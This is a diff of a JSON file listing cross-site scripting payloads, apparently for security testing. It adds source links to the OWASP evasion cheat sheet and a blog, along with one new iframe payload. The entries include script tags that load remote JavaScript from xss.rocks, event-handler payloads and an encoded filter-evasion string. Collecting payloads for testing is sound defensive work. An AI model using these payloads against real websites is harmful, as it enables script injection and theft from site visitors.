@@ -10,6 +10,11 @@
     },
     {
         "xss_injection": "tag",
+        "xss_string": "<iframe src=\"javascript:alert('XSS');\"></iframe>",
+        "_source": "https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet"
+    },
+    {
+        "xss_injection": "tag",
         "xss_string": "<svg/onload=alert('XSS')>",
         "_source": "https://brutelogic.com.br/blog/xss101/"
     },
@@ -29,24 +34,24 @@
     },
     {
         "xss_injection": "tag",
-        "xss_string": "<script src=http://xss.rocks/xss.js></script>"
-    },
-    {
-        "xss_injection": "tag",
         "xss_string": "<script src=http://xss.rocks/xss.js></script>",
+        "_source": "https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet",
         "_comment": "TODO: add URL obfuscation" 
     },
     {
         "xss_injection": "tag",
-        "xss_string": "<div style=font-size:500px onmouseover=alert(1)>Over there!"
+        "xss_string": "<div style=font-size:500px onmouseover=alert(1)>Over there!",
+        "_source": "https://brutelogic.com.br/blog/agnostic-event-handlers/"
     },
     {
         "xss_injection": "tag",
-        "xss_string": "<frameset><frame src onload=alert(1)>"
+        "xss_string": "<frameset><frame src onload=alert(1)>",
+        "_source": "https://brutelogic.com.br/blog/xss-payload-scheme/"
     },
     {
         "xss_injection": "tag",
-        "xss_string": "<table><thead%0Cstyle=font-size:700px%0Donmouseover%0A=%0Bconfirm(1)%09><td>AAAAAAAAA"
+        "xss_string": "<table><thead%0Cstyle=font-size:700px%0Donmouseover%0A=%0Bconfirm(1)%09><td>AAAAAAAAA",
+        "_source": "https://brutelogic.com.br/blog/xss-payload-scheme/"
     }
 
 
